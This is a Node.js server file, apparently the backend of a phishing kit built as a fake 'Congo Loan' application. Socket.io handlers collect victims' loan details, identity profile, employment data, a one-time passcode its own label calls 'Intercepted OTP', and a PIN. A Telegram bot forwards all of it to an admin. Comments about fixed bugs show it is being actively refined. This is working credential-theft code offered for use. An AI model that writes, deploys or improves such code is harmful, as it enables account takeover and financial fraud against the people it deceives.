require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render (CORS is essential)
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Link socket globally so botManager can call back rooms

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook Route for Telegram
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate unique Congo application session tag
    const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    // Send AppID back to the frontend right away
    socket.emit('session-ready', { appId: appId });

    // FIX BUG 3 & 4: Explicit room listener matching frontend: this.socket.emit('join-room', data.appId)
    socket.on('join-room', (room) => {
        socket.join(room);
        console.log(`🔌 Congo User joined room: ${room}`);
    });

    // Standard Log Streams
    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
    
    // FIX BUG 1: Matched to frontend event 'step3-data'
    socket.on('step3-data', (data) => {
        botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false);
    });

    // FIX BUG 1: Matched to frontend event 'step4-otp'
    socket.on('step4-otp', (data) => {
        botManager.sendToAdmin(appId, "🇨🇩 Step 4: Intercepted OTP", data, true);
    });

    // FIX BUG 1 & 6: Matched to frontend event 'step5-pin' and extracts data.pin correctly
    socket.on('step5-pin', (data) => {
        botManager.sendFinalApproval(appId, data.pin);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected: ${appId}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Congo Loan Server running on port ${PORT}`);
    
    // Auto-configure Webhooks on deployment platforms like Render
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
    }
});